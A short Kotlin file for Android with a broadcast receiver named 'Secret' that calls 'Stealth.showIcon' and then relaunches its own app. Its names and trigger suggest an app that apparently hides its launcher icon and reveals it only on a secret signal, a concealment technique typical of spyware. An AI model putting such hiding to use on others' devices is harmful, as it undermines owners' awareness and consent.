package com.sys.sync

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper

class Secret : BroadcastReceiver() {
    override fun onReceive(c: Context, i: Intent) {
        Stealth.showIcon(c)
        Handler(Looper.getMainLooper()).postDelayed({
            val li = c.packageManager.getLaunchIntentForPackage(c.packageName)
            li?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            runCatching { c.startActivity(li) }
        }, 700)
    }
}
